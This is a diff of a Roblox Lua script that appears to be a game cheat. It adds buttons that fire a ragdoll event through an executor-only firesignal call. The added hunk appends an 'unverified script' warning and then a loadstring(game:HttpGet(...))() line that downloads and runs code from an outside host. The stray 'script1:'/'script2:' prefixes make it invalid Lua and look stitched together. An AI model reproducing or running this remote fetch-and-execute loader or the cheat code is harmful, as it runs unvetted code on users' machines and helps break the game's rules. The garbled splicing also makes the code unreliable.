@@ -1,4 +1,4 @@
-local Players = game:GetService("Players")
+script1: local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
@@ -46,3 +46,12 @@ end)
 createButton("Up", 110, Color3.fromRGB(50, 150, 50), function()
     pcall(function() firesignal(RagdollEvent.OnClientEvent, "Destroy", 2.5) end)
 end)
+script2: -- [[ Rscripts Risk Notice ]]
+-- This script is not verified by rscripts.net. Deal with caution.
+--
+-- Stay safe:
+--   • Never log in on unofficial Roblox sites or lookalike domains.
+--   • Real Roblox links use roblox.com (check the .com ending).
+--   • Treat fake Roblox login / "claim reward" pages as phishing.
+-- [[ End Rscripts Risk Notice ]]
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/20799364a69a0551e5fc1ab8ea9a7820e1947c1c3e6258dba24a3588778bb879/download"))()
